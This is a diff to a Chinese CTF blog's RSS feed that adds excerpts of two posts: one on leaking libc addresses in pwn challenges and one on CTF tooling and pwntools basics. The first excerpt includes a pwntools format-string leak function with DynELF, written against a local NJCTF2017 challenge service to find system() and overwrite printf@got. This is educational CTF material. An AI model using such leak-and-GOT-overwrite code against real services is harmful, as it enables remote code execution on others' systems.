@@ -14,8 +14,23 @@
       
       <guid>https://iluvata.github.io/post/2021-11-10_ctf-libc-leak/</guid>
       <description>libc泄漏在pwn题里很常见，在这里整理一下常见的泄漏libc的方法。 ROP中的ret2libc需要知道libc的版本和偏移，需要泄漏内存中函数的地址。 fmtstr中有时需要知道libc的偏移后用system函数覆盖某些函数的got。 堆利用中也会有用system覆盖函数got的利用方式。
-格式化字符串漏洞  NJCTF2017 pingme  这题是blind fmt，只提供了ip和端口。在从内存dump下代码后搜索到printf@got，泄漏出printf地址。用泄漏的printf地址搜索libc-database得到libc版本后在libc中搜到system，用system和printf的相对地址转化得到system在进程中的地址。然后利用fmtstring用system覆盖printf@got。 如果libc-database搜不到，可以用DynELF来泄漏system地址。
-def leak(addr): p = remote(&amp;#39;127.0.0.1&amp;#39;, &amp;#39;10001&amp;#39;) p.recvline() payload = &amp;#34;%9$s.AAA&amp;#34; + p32(addr) p.sendline(payload) data = p.recvuntil(&amp;#34;.AAA&amp;#34;)[:-4] + &amp;#34;\x00&amp;#34; log.info(&amp;#34;leaking: 0x%x--&amp;gt; %s&amp;#34; % (addr, data.encode(&amp;#39;hex&amp;#39;))) p.close() return data data = DynELF(leak, 0x08048490) # Entry point address system_addr = data.lookup(&amp;#39;system&amp;#39;, &amp;#39;libc&amp;#39;) printf_addr = data.lookup(&amp;#39;printf&amp;#39;, &amp;#39;libc&amp;#39;) log.info(&amp;#34;system address: 0x%x&amp;#34; % system_addr) log.info(&amp;#34;printf address: 0x%x&amp;#34; % printf_addr)   DynELF 不要求我们拿到 libc.</description>
+常见泄漏方法  未知libc版本时  常用的泄漏方法有泄漏某个函数的got内容，根据泄漏的地址用LibcSearcher搜索libc。函数的got地址可以用ELF在目标二进制文件中搜到。 在可以泄漏任意地址内容的时候可以用DynELF。
+    格式化字符串漏洞  NJCTF2017 pingme  这题是blind fmt，只提供了ip和端口。在从内存dump下代码后搜索到printf@got，泄漏出printf地址。用泄漏的printf地址搜索libc-database得到libc版本后在libc中搜到system，用system和printf的相对地址转化得到system在进程中的地址。然后利用fmtstring用system覆盖printf@got。 如果libc-database搜不到，可以用DynELF来泄漏system地址。
+def leak(addr): p = remote(&amp;#39;127.0.0.1&amp;#39;, &amp;#39;10001&amp;#39;) p.recvline() payload = &amp;#34;%9$s.AAA&amp;#34; + p32(addr) p.sendline(payload) data = p.recvuntil(&amp;#34;.AAA&amp;#34;)[:-4] + &amp;#34;\x00&amp;#34; log.info(&amp;#34;leaking: 0x%x--&amp;gt; %s&amp;#34; % (addr, data.encode(&amp;#39;hex&amp;#39;))) p.close() return data data = DynELF(leak, 0x08048490) # Entry point address system_addr = data.lookup(&amp;#39;system&amp;#39;, &amp;#39;libc&amp;#39;) printf_addr = data.lookup(&amp;#39;printf&amp;#39;, &amp;#39;libc&amp;#39;) log.info(&amp;#34;system address: 0x%x&amp;#34; % system_addr) log.</description>
+    </item>
+    
+    <item>
+      <title>CTF基本工具使用指北</title>
+      <link>https://iluvata.github.io/post/2021-09-24_ctf-tools/</link>
+      <pubDate>Fri, 24 Sep 2021 14:43:07 +0800</pubDate>
+      
+      <guid>https://iluvata.github.io/post/2021-09-24_ctf-tools/</guid>
+      <description>环境搭建  在mac上我觉得比较好用的环境是multipass中ubuntu虚拟机+宿主机中的idapro，以及宿主机上vscode写python wp，在虚拟机中运行。
+ multipass默认分配的内存和磁盘不太够用，建议内存分4G，磁盘分15G。ubuntu版本选择16.04. 虚拟机内环境配置可以参考pwn-env-init，建议使用py2. 但是脚本是用apt-get安装pip的，可能会有些问题，需要 curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py 然后运行 get-pip.py 。还有 one_gadget 目前需要ruby版本高于2.4，apt-get安装的ruby是2.3。可以执行下面的命令安装
+$ sudo apt-add-repository ppa:brightbox/ruby-ng $ sudo apt-get update $ sudo apt-get install ruby2.4 ruby2.4-dev $ ruby2.4 -v   还可以装个 tmux ，在pwntools连接gdb调试的时候在开头加上下面代码就可以分出调试窗口（虽然我现在也还没配好pwntools舒服地连gdb的环境。。。）。
+context.arch=&amp;#34;amd64&amp;#34; context.terminal = [&amp;#39;tmux&amp;#39;, &amp;#39;splitw&amp;#39;, &amp;#39;-h&amp;#39;]    pwntools  io交互  连接
+本地 ：sh = porcess(&amp;#34;./level0&amp;#34;) 远程：sh = remote(&amp;#34;127.0.0.1&amp;#34;,10001) 关闭连接：sh.close()   io
+sh.send(data) 发送数据 sh.sendline(data) 发送一行数据，相当于在数据后面加\n sh.recv(numb = 2048, timeout = dufault) 接受数据，numb指定接收的字节，timeout指定超时 sh.</description>
     </item>
     
   </channel>
